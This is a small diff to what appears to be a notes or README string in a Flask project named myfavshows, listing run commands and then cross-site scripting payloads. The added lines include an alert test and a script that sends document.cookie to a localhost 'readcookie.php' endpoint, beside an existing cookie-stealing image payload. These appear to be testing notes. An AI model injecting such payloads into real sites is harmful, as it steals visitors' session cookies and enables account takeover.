@@ -61,5 +61,7 @@ set FLASK_APP=myfavshows
 set FLASK_ENV=development
 flask run
 
+<script>alert('test');</script>
 <script>document.write('<img src="http://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
+<script>new Image().src="http://localhost/readcookie.php?"+document.cookie;</script>
 """
